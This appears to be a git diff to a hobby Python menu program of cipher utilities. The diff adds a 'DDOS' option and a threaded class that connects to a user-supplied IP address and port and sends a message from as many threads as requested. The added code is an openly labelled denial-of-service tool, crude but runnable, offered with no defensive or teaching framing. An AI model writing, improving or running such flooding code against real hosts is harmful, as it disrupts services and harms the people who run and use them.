@@ -92,38 +92,29 @@ class VigenereCipher:
             key = ''.join([self.alphabet[(self.alphabet.index(c) + i) % 26] for c in self.alphabet])
             print(f'Key: {key}, Decrypted text: {self.decrypt(key)}')
 
-class myThread(threading.Thread):
-    def __init__(self, threadID, name, counter):
+
+class DDOS(threading.Thread):
+    def __init__(self, threadID, name, counter, ip, port, msg):
         threading.Thread.__init__(self)
         self.threadID = threadID
         self.name = name
         self.counter = counter
-
-    def run(self):
-        print("Starting " + self.name)
-        DDosAttack.attack(self)
-        print("Exiting " + self.name)
-
-class DDosAttack:
-    def __init__(self, ip,port,thread,packet):
         self.ip = ip
         self.port = port
-        self.thread = thread
-        self.packet = packet
+        self.msg = msg
 
     def attack(self):
         # Create a TCP/IP socket
-        sock = socket.socket
-        (socket.AF_INET, socket.SOCK_STREAM)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         # Connect the socket to the port where the server is listening
         server_address = (self.ip, self.port)
         print(sys.stderr, 'connecting to %s port %s' % server_address)
         sock.connect(server_address)
         try:
             # Send data
-            threadmsg = 'Thread-', self.thread, ':', self.packet
+            threadmsg = 'Thread-', self.threadID, ':', self.msg;
             message = str.encode(str(threadmsg))
-            print(sys.stderr, 'thread-', self.thread, 'sending "%s"' % message)
+            print(sys.stderr, 'thread-', self.threadID, 'sending "%s"' % message)
             sock.sendall(message)
             # Look for the response
             amount_received = 0
@@ -131,16 +122,15 @@ class DDosAttack:
             while amount_received < amount_expected:
                 data = sock.recv(16)
                 amount_received += len(data)
-                print(sys.stderr, 'thread-', self.thread, 'received "%s"' % data)
+                print(sys.stderr, 'received "%s"' % data)
         finally:
-            print(sys.stderr, 'thread-', self.thread, 'closing socket')
+            print(sys.stderr, 'closing socket')
             sock.close()
-        i=0
-        while i<self.packet:
-            i=i+1
-            attack = DDosAttack(self.ip,self.port,self.thread,self.packet)
-            attack.attack()
 
+    def run(self):
+        print("Starting " + self.name)
+        self.attack()
+        print("Exiting " + self.name)
 
 if __name__ == '__main__':
     print("Welcome to the main program")
@@ -151,7 +141,8 @@ if __name__ == '__main__':
         print("3. Encrypt a string")
         print("4. Decrypt a string")
         print("5. Decrypt a string with Vigenere Cipher")
-        print("6. Exit")
+        print("6. DDOS")
+        print("7. Exit")
         option = int(input("Please enter your option: "))
         if option == 1:
             print("Please select a language:")
@@ -200,6 +191,19 @@ if __name__ == '__main__':
             vigenereCipher = VigenereCipher(encrypted_text)
             vigenereCipher.decrypt_with_all_keys()
         elif option == 6:
+            ip = input("Please enter an IP address: ")
+            port = int(input("Please enter a port number: "))
+            msg = input("Please enter a message: ")
+            thread_count = int(input("Please enter the number of threads: "))
+            threads = []
+            for i in range(thread_count):
+                thread = DDOS(i, "Thread-" + str(i), i, ip, port, msg)
+                threads.append(thread)
+            for thread in threads:
+                thread.start()
+            for thread in threads:
+                thread.join()
+        elif option == 7:
             exit(0)
         else:
             print("Invalid input")
